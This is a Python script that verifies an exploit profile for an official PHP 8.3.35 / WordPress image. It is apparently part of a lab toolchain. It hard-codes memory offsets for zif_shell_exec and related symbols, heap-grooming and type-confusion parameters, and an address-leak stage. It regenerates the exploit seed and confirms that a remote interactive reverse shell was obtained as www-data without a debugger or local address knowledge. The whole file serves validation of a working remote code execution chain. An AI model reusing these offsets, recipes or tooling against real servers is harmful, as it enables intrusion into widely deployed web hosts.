#!/usr/bin/env python3
"""Offline verifier for the official PHP 8.3.35 terminal-ready profile."""

import hashlib
import json
from pathlib import Path

import auto_profile_shell as auto

HERE = Path(__file__).resolve().parent
PROFILE_ID = "php8335-official-wp712-prefork150-fanchor-v1"
EVIDENCE = HERE / "official-php8335-terminal-evidence"
EXPECTED_IMAGE = "sha256:4abf7a450ee477dde967584f8174d7e03221d224c4971a0c38d84e7254426e64"
EXPECTED_MODULE = "212564d66bb2d475b1ba1ed8495bee79be06980332e2c1de777138ff6312bc33"
EXPECTED_STRUCTURAL = "2af81b3a70d5db3ba0060a471c7ce1f8b4537996f99fe566a26b39511b2ff5e7"


def sha256(path):
    return hashlib.sha256(path.read_bytes()).hexdigest()


def require(condition, message):
    if not condition:
        raise AssertionError(message)


def load(name):
    return json.loads((EVIDENCE / name).read_text("utf-8"))


def main():
    profile = next(item for item in auto.load_registry(
        HERE / "auto_profiles_v2.json") if item["id"] == PROFILE_ID)
    require(profile["status"] == "READY", "profile status")
    require(profile["capabilities"] == {"leak": "READY", "terminal": "READY"},
            "capabilities")
    require(profile["implementation"] == "php8335-fanchor-v1", "implementation")
    require(profile["worker_count"] == 150, "workers")
    require(profile["offsets"] == {"zval_ptr_dtor": "0x49ec50",
            "zif_shell_exec": "0x3ac740", "terminal_backing": "0x65140"},
            "offsets")
    term = profile["terminal"]
    require(term["fillers"] == 905 and term["refresh_lane_after_a1"] is True
            and term["refresh_lane_after_b1"] is True, "terminal recipe")
    require(term["safe_type_hex"] == "0100"
            and term["positive_type_hex"] == "0703", "type bytes")
    require(term["normalized_positive_seed_sha256"] == EXPECTED_STRUCTURAL,
            "structural profile seed")

    safe, positive = load("safe.receipt.json"), load("positive.receipt.json")
    safe_control = load("safe.control.json")
    positive_control = load("positive.control.json")
    transcript = (EVIDENCE / "session.raw").read_bytes()
    require(safe["status"] == "SAFE_CONTROL_PASS" and safe["callbacks"] == 0,
            "safe result")
    require(safe["terminal_armed"] is False, "safe armed")
    require(safe["prime"]["status"] == "HTTP/1.1 301 Moved Permanently",
            "safe prime")
    require(safe["terminal_response"]["status"] ==
            "HTTP/1.0 500 Internal Server Error", "safe terminal")
    require(safe["health"]["status"] == "HTTP/1.1 200 OK"
            and safe["selector_final"]["unique_lane_checks"] >= 5,
            "safe same-lane health")
    require(positive["status"] == "INTERACTIVE_REVERSE_SHELL",
            "positive status")
    require(positive["callback_peer"].split(":", 1)[0] == positive["target"],
            "callback peer")
    require(positive["exit_command_sent"] is False, "exit boundary")
    require(positive["health"]["status"] == "HTTP/1.1 200 OK", "positive health")
    require(safe["terminal"]["seed_type"] == "IS_NULL"
            and positive["terminal"]["seed_type"] == "IS_ARRAY_EX", "types")
    for row in (safe, positive):
        terminal = row["terminal"]
        require(terminal["safe_delta_offsets"] == [80, 81]
                and terminal["safe_hex"] == "0100"
                and terminal["positive_hex"] == "0703", "seed delta")
        regenerated = auto.php8335_make_seed(
            int(terminal["backing"], 16), int(terminal["zif_shell_exec"], 16),
            terminal["command"], False)
        require(hashlib.sha256(regenerated).hexdigest() ==
                terminal["positive_seed_sha256"], "positive seed bytes")
        require(auto.normalized_terminal_seed_sha256(regenerated) ==
                EXPECTED_STRUCTURAL, "structural seed")
        require(terminal["backing"].endswith("65140"), "backing")
        require(row["leak"]["cookie_len"] == 512
                and row["leak"]["hash_tables"] == 7, "leak")
        for key in ("gdb_used", "proc_maps_used", "locally_supplied_addresses"):
            require(row[key] is False, key)
    require(safe["terminal"]["command"] == positive["terminal"]["command"],
            "command identity")

    text = transcript.decode("utf-8", "replace")
    require("Q618_BEGIN" in text and "Q618_END" in text, "markers")
    require("\nwww-data\n" in text, "whoami")
    require("uid=33(www-data) gid=33(www-data)" in text, "uid/gid")
    require("\n/var/www/html\n" in text, "pwd")
    require(sha256(EVIDENCE / "session.raw") == positive["transcript_sha256"],
            "transcript hash")
    require(safe_control["status"] == "OFFICIAL_PHP8335_SAFE_CONTROL_PASS",
            "safe control")
    require(positive_control["status"] == "OFFICIAL_PHP8335_REVERSE_SHELL_PASS",
            "positive control")
    require(safe_control["source_sha256"] == positive_control["source_sha256"],
            "source identity")
    for control in (safe_control, positive_control):
        target = control["target"]
        require(target["image_digest"] == EXPECTED_IMAGE, "image")
        require(target["module_sha256"] == EXPECTED_MODULE, "module")
        require(target["network_internal"] is True
                and target["max_request_workers"] == 150, "target profile")
        require(control["external_network"] is False, "network boundary")
        require(control["homepage"]["unchanged"] is True, "homepage")

    print(json.dumps({
        "verdict": "PHP8335_OFFICIAL_TERMINAL_READY_PROFILE_PASS",
        "profile": PROFILE_ID,
        "selection_signature": profile["selection_signature"],
        "safe": "IS_NULL callbacks=0 terminal=500 same-cage health=200",
        "positive": {"peer": positive["callback_peer"], "whoami": "www-data",
                     "uid": 33, "hostname": "e0e98551a680",
                     "pwd": "/var/www/html", "exit_command_sent": False},
        "structural_seed": EXPECTED_STRUCTURAL,
    }, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
